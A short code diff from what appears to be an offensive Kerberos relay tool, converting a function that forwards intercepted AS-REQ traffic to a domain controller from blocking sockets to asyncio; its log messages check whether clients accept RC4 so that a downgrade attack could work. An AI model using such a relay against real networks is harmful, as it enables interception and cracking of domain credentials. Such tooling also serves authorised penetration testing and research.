@@ -202,11 +202,12 @@ async def relay_to_dc(data, client_address):
                 logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
         else :
             logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((host, port))
-    client_socket.sendall(data)
-    response = client_socket.recv(2048)
-    client_socket.close()
+    reader, writer = await asyncio.open_connection(dc,88)
+    writer.write(data)
+    await writer.drain()
+    response = await reader.read(2048)
+    writer.close()
+    await writer.wait_closed()
     krb_response = KerberosTCPHeader(response)
 
     if krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19 :
